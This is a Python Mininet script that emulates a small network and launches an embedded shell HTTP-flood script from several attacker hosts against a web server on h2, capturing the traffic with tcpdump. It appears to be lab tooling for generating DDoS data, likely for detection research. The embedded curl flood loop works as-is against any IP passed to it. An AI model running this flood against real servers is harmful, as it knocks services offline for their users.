#!/usr/bin/env python3
# generate_ddos_http_from_shell.py
# Mininet script: deploy and run the provided ddos_no_flood shell on attacker hosts.
# If --duration is omitted, attacks run infinitely until Ctrl-C.
#
# Usage examples:
# sudo python3 generate_ddos_http_from_shell.py --attackers 6 --concurrency 12 --duration 60
# sudo python3 generate_ddos_http_from_shell.py --attackers 4 --concurrency 8    # runs infinite until Ctrl-C

from mininet.topo import Topo
from mininet.net import Mininet
from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.node import OVSKernelSwitch, RemoteController
from time import sleep
import argparse
from datetime import datetime
from random import sample
import sys
import signal

# ---------- the ddos shell script content (adjusted to accept empty duration => infinite) ----------
DDOS_SCRIPT = r'''#!/bin/sh
# ddos_no_flood.sh - POSIX shell load generator for Mininet lab.
# Usage: ./ddos_no_flood.sh [target_ip] [duration_seconds_or_empty_for_infinite] [concurrency]
# Example: ./ddos_no_flood.sh 10.0.0.1 60 12
target=${1:-10.0.0.1}
duration=${2:-}    # if empty -> infinite
conc=${3:-10}

# check curl
if ! command -v curl >/dev/null 2>&1; then
  echo "curl not found. Install curl (sudo apt install -y curl) and retry."
  exit 1
fi

now=$(date +%s)

if [ -z "$duration" ]; then
  infinite=1
else
  infinite=0
  end=$((now + duration))
fi

echo "Starting HTTP load -> $target for ${duration:-INFINITE}s with ${conc} clients (infinite=${infinite})"

i=0
while [ "$i" -lt "$conc" ]; do
  (
    if [ "$infinite" -eq 1 ]; then
      while true; do
        curl -s --connect-timeout 1 --max-time 2 "http://$target/" >/dev/null 2>&1 || true
        # short pause; set to 0 to run flat-out (may use CPU)
        sleep 0
      done
    else
      while [ "$(date +%s)" -lt "$end" ]; do
        curl -s --connect-timeout 1 --max-time 2 "http://$target/" >/dev/null 2>&1 || true
        sleep 0
      done
    fi
  ) &
  i=$((i + 1))
done

# wait for all background workers
wait
echo "Load generator finished."
'''

# ---------- topology (same sizes as original, simplified builder) ----------
class MyTopo( Topo ):
    def build( self ):
        s1 = self.addSwitch( 's1', cls=OVSKernelSwitch, protocols='OpenFlow13' )
        # create 18 hosts and split to 6 switches like original
        hosts = []
        for i in range(1,19):
            mac = "00:00:00:00:00:{:02x}".format(i)
            ip = "10.0.0.{}/24".format(i)
            hosts.append(self.addHost(f'h{i}', cpu=1.0/20, mac=mac, ip=ip))

        s2 = self.addSwitch( 's2', cls=OVSKernelSwitch, protocols='OpenFlow13' )
        s3 = self.addSwitch( 's3', cls=OVSKernelSwitch, protocols='OpenFlow13' )
        s4 = self.addSwitch( 's4', cls=OVSKernelSwitch, protocols='OpenFlow13' )
        s5 = self.addSwitch( 's5', cls=OVSKernelSwitch, protocols='OpenFlow13' )
        s6 = self.addSwitch( 's6', cls=OVSKernelSwitch, protocols='OpenFlow13' )

        # attach groups of 3 hosts to each switch
        for i in range(1,19):
            if i <= 3:
                self.addLink(f'h{i}', s1)
            elif i <= 6:
                self.addLink(f'h{i}', s2)
            elif i <= 9:
                self.addLink(f'h{i}', s3)
            elif i <= 12:
                self.addLink(f'h{i}', s4)
            elif i <= 15:
                self.addLink(f'h{i}', s5)
            else:
                self.addLink(f'h{i}', s6)

        # chain switches
        self.addLink(s1, s2)
        self.addLink(s2, s3)
        self.addLink(s3, s4)
        self.addLink(s4, s5)
        self.addLink(s5, s6)

# ---------- main runner ----------
def startNetwork(duration_sec, num_attackers_param, stagger_sec, concurrency):
    topo = MyTopo()
    c0 = RemoteController('c0', ip='127.0.0.1', port=6653)
    net = Mininet(topo=topo, link=TCLink, controller=c0)
    net.start()

    # gather hosts
    hs = { f'h{i}': net.get(f'h{i}') for i in range(1,19) }
    hosts = list(hs.values())

    victim = hs['h2']   # keep victim as h2 like original
    victim_ip = '10.0.0.2'

    # ensure webserver files dir exists and start simple HTTP server
    print("[*] Starting simple http.server on victim h2 (port 80)")
    victim.cmd('mkdir -p /home/mininet/webserver || true')
    victim.cmd('cd /home/mininet/webserver && python3 -m http.server 80 >/dev/null 2>&1 &')

    # choose attackers
    available_attackers = [h for h in hosts if h.name != 'h2']
    max_attackers = len(available_attackers)
    num_attackers = max(1, min(num_attackers_param, max_attackers))
    attackers = sample(available_attackers, k=num_attackers)
    print("[*] Selected attackers:", [a.name for a in attackers])

    # start tcpdump on victim for later verification
    pcap_path = '/tmp/h2_http_capture.pcap'
    print(f"[*] Starting tcpdump on victim h2 -> {pcap_path}")
    # if duration is None (infinite), set cap_time high (will be killed in cleanup)
    cap_time = duration_sec*4 if duration_sec else 36000
    victim.cmd(f'timeout {cap_time}s tcpdump -n -i h2-eth0 -w {pcap_path} &')

    # deploy the shell script content to each attacker and run it
    for a in attackers:
        # write script file to /tmp/ddos_no_flood.sh on attacker
        a.cmd("cat > /tmp/ddos_no_flood.sh <<'SH'\n" + DDOS_SCRIPT + "\nSH")
        a.cmd('chmod +x /tmp/ddos_no_flood.sh')

    # prepare arg string for duration: if duration_sec is None -> pass empty second arg to indicate infinite
    duration_arg = str(duration_sec) if duration_sec else ''

    print(f"[*] Launching ddos on attackers (concurrency per attacker = {concurrency}), duration_arg='{duration_arg or 'INFINITE'}'")
    try:
        for idx,a in enumerate(attackers):
            # run the script on attacker in background
            # pass: target_ip {duration or empty} concurrency
            cmd = f"/tmp/ddos_no_flood.sh {victim_ip} '{duration_arg}' {concurrency} &"
            print(f"  - starting {a.name}: {cmd[:120]}")
            a.cmd(cmd)
            sleep(stagger_sec)
        # if duration is provided, wait duration + small buffer; else wait until KeyboardInterrupt
        if duration_sec:
            print(f"[*] Attack running for {duration_sec}s ...")
            sleep(duration_sec + 2)
            print("[*] Attack finished by duration.")
        else:
            print("[*] Attack running INFINITELY. Press Ctrl-C here to stop and cleanup.")
            # block until Ctrl-C
            while True:
                sleep(1)
    except KeyboardInterrupt:
        print("\n[!] KeyboardInterrupt received — stopping attacks and cleaning up...")
    finally:
        # cleanup: kill ddos script processes, curl, tcpdump, http.server on hosts
        print("[*] Cleanup: killing ddos scripts and curl on attackers, stopping tcpdump and http.server on victim.")
        for a in attackers:
            # pkill the script and curl (be permissive)
            a.cmd("pkill -f /tmp/ddos_no_flood.sh || true")
            a.cmd("pkill -f curl || true")
            a.cmd("rm -f /tmp/ddos_no_flood.sh || true")
        victim.cmd("pkill -f http.server || true")
        victim.cmd("pkill -f tcpdump || true")

        # small wait then stop network
        sleep(1)
        net.stop()
        print("[*] Mininet stopped. Exiting.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Mininet HTTP-only ddos deployer (uses embedded ddos_no_flood script). If --duration omitted or 0 => run infinite until Ctrl-C.')
    parser.add_argument('--duration', type=int, default=0, help='seconds per flood; if 0 or omitted -> run infinite until Ctrl-C')
    parser.add_argument('--attackers', type=int, default=5, help='number of attacker hosts')
    parser.add_argument('--stagger', type=float, default=0.02, help='seconds to stagger attacker starts')
    parser.add_argument('--concurrency', type=int, default=10, help='number of concurrent curl clients per attacker')
    args = parser.parse_args()

    setLogLevel('info')
    dur = args.duration if args.duration and args.duration > 0 else None
    try:
        startNetwork(duration_sec=dur, num_attackers_param=args.attackers, stagger_sec=args.stagger, concurrency=args.concurrency)
    except Exception as e:
        print("Exception:", e)
        sys.exit(1)
